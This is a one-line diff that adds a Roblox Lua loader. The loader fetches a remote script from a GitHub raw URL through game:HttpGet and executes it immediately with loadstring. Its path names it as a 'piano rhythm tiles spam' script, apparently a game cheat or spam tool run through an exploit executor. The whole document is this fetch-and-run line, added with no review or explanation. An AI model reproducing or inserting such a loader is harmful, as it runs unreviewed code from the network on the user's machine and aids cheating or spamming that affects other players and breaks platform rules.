@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/piano-rhythm-tiles-spam5-2tz5qi42mco5wg.lua"))()
